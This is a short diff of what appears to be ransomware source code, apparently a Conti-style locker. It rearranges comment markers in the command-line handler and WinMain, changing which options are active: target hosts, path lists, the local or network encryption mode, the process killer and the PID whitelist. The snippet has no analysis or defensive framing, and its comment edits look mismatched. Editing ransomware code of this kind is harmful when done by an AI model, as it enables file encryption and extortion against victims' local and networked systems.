@@ -274,7 +274,7 @@ HandleCommandLine(PWSTR CmdLine)
 	if (!Argv) {
 		return FALSE;
 	}
-
+ /*
 	LPWSTR HostsPath = GetCommandLineArg(Argv, Argc, OBFW(L"-h"));
 	LPWSTR PathList = GetCommandLineArg(Argv, Argc, OBFW(L"-p"));
 	LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L"-m"));
@@ -319,7 +319,7 @@ HandleCommandLine(PWSTR CmdLine)
 		ParseFile(PathList, &g_PathList);
 	}
 
-	/*
+	
 	if (PidList) {
 		ParsePidList(PidList, &g_WhitelistPids);
 	}
@@ -334,7 +334,7 @@ HandleCommandLine(PWSTR CmdLine)
 	}
 
 
-	/*
+	
 	if (ProcKiller) {
 		if (!plstrcmpiW(ProcKiller, OBFW(L"enabled"))) {
 			global::SetProcKiller(TRUE);
@@ -466,6 +466,7 @@ int WINAPI WinMain(
 
 	}
 
+ */
 	if (g_EncryptMode == LOCAL_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {
 
 		if (hLocalSearch) {
@@ -475,6 +476,7 @@ int WINAPI WinMain(
 
 	}
 
+*/
 	if (g_EncryptMode == NETWORK_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {
 		threadpool::Wait(threadpool::NETWORK_THREADPOOL);
 	}
